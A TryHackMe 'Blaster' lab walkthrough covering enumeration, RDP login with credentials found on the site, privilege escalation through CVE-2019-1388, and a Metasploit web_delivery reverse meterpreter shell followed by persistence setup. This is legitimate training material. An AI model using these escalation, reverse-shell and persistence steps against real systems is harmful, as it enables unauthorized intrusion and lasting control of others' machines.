# 🧨 Blaster – TryHackMe Walkthrough

---

## 🧪 Task 1: Machine Deployment
```bash
# Connect to VPN
sudo openvpn your-vpn-config.ovpn

# Add hostname for easier access
echo "10.10.156.253 blast" | sudo tee -a /etc/hosts
```

---

## 🔎 Task 2: Enumeration

### 🔍 Nmap Scan
```bash
nmap -sV -sC -p- blast
```

### ✅ Nmap Result
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0

3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393

5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

---

## 📂 Directory Brute-Force
```bash
gobuster dir -u http://blast/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

✅ Discovered Directory:
```
/retro
```

- Visiting `/retro` reveals credentials for RDP:  
  **Username:** `wade`  
  **Password:** `parzival`

---

## 🖥️ Task 2.5: RDP Access
```bash
xfreerdp3 /v:blast /u:wade /p:'parzival' /cert:ignore +auto-reconnect /timeout:60000
```

- Once logged in, open `C:\Users\wade\Desktop\user.txt` to grab the user flag.

---

## 🔓 Task 3: Privilege Escalation (CVE-2019-1388)

### 🗑️ Step 1: Open `hhupd.exe` from the Recycle Bin
- Right-click → **Run as Administrator**

### 🌐 Step 2: Click the certificate info link inside the Help window
- This launches **Internet Explorer** with elevated SYSTEM privileges.

### 💾 Step 3: Save the webpage (`Ctrl + S`)
- In the "Save As" dialog, open the file browser

### 📁 Step 4: Use file browser to run `cmd.exe`
- In the address bar:
```text
C:\Windows\System32\cmd.exe
```

### 🛡️ Step 5: Check system privileges
```bash
whoami
```
✅ Output:
```
nt authority\system
```

---

## 🏴 Task 3.5: Grab the Administrator Flag
```bash
type C:\Users\Administrator\Desktop\root.txt
```

---

## 🛡️ Task 4: Persistence with Metasploit
```bash
# Start Metasploit
msfconsole -q

# Use the web delivery module
use exploit/multi/script/web_delivery
```

```bash
# Set necessary options
set target 2
set lhost 10.10.XXX.XXX    # Your tun0 IP
set lport 4444
set payload windows/meterpreter/reverse_http
```

```bash
# Run the module
run -j
```

🖥️ On the target (inside the elevated CMD), paste the generated PowerShell command to spawn a reverse shell.

---

## 📌 Final Step: Set Up Persistence
```bash
# Once meterpreter session is open
sessions -i <session-id>
run persistence -X
```

---

✅ **Machine Owned!**  
You now have full SYSTEM access and persistence on the target Windows machine.